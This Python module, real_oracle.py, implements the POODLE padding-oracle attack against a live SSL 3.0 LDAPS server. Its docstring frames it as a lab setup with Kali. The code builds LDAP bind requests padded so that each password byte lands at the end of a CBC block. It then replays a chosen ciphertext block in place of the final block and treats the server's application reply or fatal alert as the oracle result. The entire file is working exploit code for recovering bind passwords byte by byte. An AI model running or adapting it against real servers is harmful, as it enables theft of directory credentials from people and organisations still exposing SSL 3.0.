"""real_oracle.py — Real POODLE oracle against a live SSL 3.0 LDAPS server.

Each oracle query:
  1. Opens a fresh TCP connection to the server
  2. Completes an SSL 3.0 handshake (gets session keys)
  3. Encrypts the LDAP bind plaintext with the session key,
     replacing the last ciphertext block with the target block
  4. Sends the modified record
  5. Returns True (HIT) if the server sends an LDAP application response,
     False (MISS) if the server sends a TLS fatal alert

Why a fresh connection per query?
  After receiving a bad_record_mac alert the server closes the session.
  The real POODLE attack causes the victim's browser to open many requests
  (via injected JavaScript); here Kali is both client and attacker.
"""

import socket
import struct
from ssl3_client import SSL3Client, ssl3_mac, ssl3_pad, RT_ALERT, RT_APPDATA


def _ber_len(n: int) -> bytes:
    if n < 128:
        return bytes([n])
    elif n < 256:
        return bytes([0x81, n])
    return bytes([0x82, (n >> 8) & 0xFF, n & 0xFF])


def build_ldap_bind(dn: str, password: str) -> bytes:
    """Build LDAP Simple Bind Request (ASN.1 BER)."""
    dn_b = dn.encode()
    pw_b = password.encode()
    version = b"\x02\x01\x03"
    dn_tlv  = b"\x04" + _ber_len(len(dn_b)) + dn_b
    pw_tlv  = b"\x80" + _ber_len(len(pw_b)) + pw_b
    bind    = b"\x60" + _ber_len(len(version + dn_tlv + pw_tlv)) + version + dn_tlv + pw_tlv
    msg_id  = b"\x02\x01\x01"
    seq_body = msg_id + bind
    return b"\x30" + _ber_len(len(seq_body)) + seq_body


def _compute_ldap_bind_sizes(dn_len: int, pw_len: int) -> dict:
    """Compute key offsets and lengths for the LDAP bind message.

    For dn_len < 128 and pw_len < 128 (safe for lab passwords):
        total = 14 + dn_len + pw_len
        password_offset = 14 + dn_len   (first byte of password within the message)
    """
    overhead = 14  # fixed bytes in our BER encoding for short dn/pw
    total    = overhead + dn_len + pw_len
    pw_off   = overhead + dn_len
    return {"total": total, "password_offset": pw_off}


def compute_dn_lengths(password: str, block_size: int = 16,
                       dn_base_len: int = 0) -> list[dict]:
    """For each password byte, compute dn_prefix_len and control_pad_len such that:

    1. The target password byte lands at the last byte of a CBC block:
       (14 + dn_prefix_len + dn_base_len + i) % block_size == block_size - 1

    2. The last plaintext block is entirely padding (force_full_block):
       (total_ldap_len + MAC_LEN) % block_size == 0

    dn_base_len must be included — the DN prefix is prepended to the existing DN,
    so the absolute offset of password byte i is 14 + k + dn_base_len + i.

    block_size: 16 for AES-128-CBC, 8 for 3DES-EDE-CBC (Windows Server default).
    """
    MAC_LEN = 20
    CTRL_OVERHEAD = 12   # fixed bytes added by the LDAP control structure (excl. j)
    pw_len = len(password)

    results = []
    for i in range(pw_len):
        # constraint 1: (14 + k + dn_base_len + i) % block_size == block_size - 1
        k = (block_size - 1 - (14 + dn_base_len + i) % block_size) % block_size

        # total LDAP message without control padding:
        # 14 (fixed overhead) + k (dn prefix) + dn_base_len + pw_len
        base_total = 14 + k + dn_base_len + pw_len

        # constraint 2: (base_total + CTRL_OVERHEAD + j + MAC_LEN) % block_size == 0
        j = (-(base_total + CTRL_OVERHEAD + MAC_LEN)) % block_size

        results.append({
            "byte_index":    i,
            "dn_prefix_len": k,
            "control_pad_len": j,
        })

    return results


def build_ldap_bind_with_control(dn_base: str, password: str,
                                  dn_prefix_len: int, control_pad_len: int) -> bytes:
    """Build an LDAP bind with:
      - DN prefixed with dn_prefix_len 'X' characters (positions target byte)
      - An LDAP Control with control_pad_len padding bytes (aligns total length)

    The control uses OID "1.1" (harmless; server may ignore or reject with an
    LDAP error — either way it's an application-level response, not a TLS alert).
    """
    dn  = "X" * dn_prefix_len + dn_base
    dn_b = dn.encode()
    pw_b = password.encode()

    version = b"\x02\x01\x03"
    dn_tlv  = b"\x04" + _ber_len(len(dn_b)) + dn_b
    pw_tlv  = b"\x80" + _ber_len(len(pw_b)) + pw_b
    bind    = b"\x60" + _ber_len(len(version + dn_tlv + pw_tlv)) + version + dn_tlv + pw_tlv
    msg_id  = b"\x02\x01\x01"

    # LDAP Control: OID "1.1" + padding value
    oid_str    = b"\x04\x03\x31\x2e\x31"                     # OCTET STRING "1.1"
    ctrl_val   = b"\x04" + _ber_len(control_pad_len) + b"\x00" * control_pad_len
    ctrl_inner = oid_str + ctrl_val
    control    = b"\x30" + _ber_len(len(ctrl_inner)) + ctrl_inner
    controls   = b"\xa0" + _ber_len(len(control)) + control

    seq_body = msg_id + bind + controls
    return b"\x30" + _ber_len(len(seq_body)) + seq_body


def real_oracle(host: str, port: int, plaintext: bytes,
                target_block_idx: int, n_blocks: int) -> bool:
    """Perform one real POODLE oracle query.

    Opens a fresh SSL 3.0 connection, encrypts `plaintext`, replaces the last
    ciphertext block with blocks[target_block_idx], sends to server.

    Returns True if the server sends an application-layer response (HIT),
    False if the server sends a TLS fatal alert (MISS).
    """
    client = SSL3Client(host, port)
    try:
        client.connect()
        bs = client.suite.block_size

        # Encrypt with our session key
        ct, iv = client.encrypt_appdata(plaintext)

        # Split into blocks
        blocks = [ct[i:i+bs] for i in range(0, len(ct), bs)]
        if target_block_idx >= len(blocks):
            return False

        # POODLE: replace last block with target block
        blocks[-1] = blocks[target_block_idx]
        modified_ct = b"".join(blocks)

        # Send the modified record
        client.send_raw_appdata(modified_ct, iv)

        # Check server response
        kind, data = client.read_response()
        return kind == "appdata"

    except Exception:
        return False
    finally:
        client.close()
